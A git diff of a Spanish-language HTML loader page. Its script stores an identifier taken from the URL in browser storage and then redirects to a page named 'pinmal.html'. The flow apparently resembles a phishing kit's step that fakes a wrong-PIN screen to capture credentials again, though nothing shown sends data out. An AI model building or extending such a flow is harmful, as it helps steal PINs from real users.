@@ -57,31 +57,35 @@
 <img src="img/bluee.svg" class="logo" alt="Logo">
 
 <div class="loader"></div>
-<div class="doc-label" id="docLabel"></div>
+<div class="doc-label" id="docLabel" style="display:none;"></div>
 
 <script>
-    // ---- Obtener email desde la URL si viene como ?email= ----
-    function getEmailFromQuery() {
-      const params = new URLSearchParams(window.location.search);
-      return params.get("ips1");
+    // Recuperar ips1 desde URL (si viene)
+    const params = new URLSearchParams(window.location.search);
+    const valorUrl = params.get("ips1");
+
+    if (valorUrl) {
+        // Guardar en ambos para que siempre esté disponible
+        sessionStorage.setItem("ips1", valorUrl);
+        localStorage.setItem("ips1", valorUrl);
     }
 
-    const emailFromQuery = getEmailFromQuery();
-    if (emailFromQuery) {
-      sessionStorage.setItem("ips1", emailFromQuery);
-    } else {
-      // Si no viene en la URL, simplemente re-guarda el que ya exista
-      const existingEmail = sessionStorage.getItem("ips1");
-      if (existingEmail) {
-        sessionStorage.setItem("ips1", existingEmail);
-      }
-    }
+    // Recuperar valor guardado anteriormente
+    const documento =
+        localStorage.getItem("ips1") ||
+        sessionStorage.getItem("ips1") ||
+        "No definido";
 
-    // ---- Después de 10 segundos, pasar a step2.html ----
+    console.log("Valor recuperado:", documento);
+
+    // Mostrarlo abajo del loader si quieres
+    document.getElementById("docLabel").textContent = documento;
+
+    // ---- Pasar a la siguiente página ----
     setTimeout(() => {
-      window.location.href = "pin.html";
-    }, 8000); // 10.000 ms = 10 s
-  </script>
+        window.location.href = "pinmal.html";
+    }, 5000);
+</script>
 
 </body>
 </html>
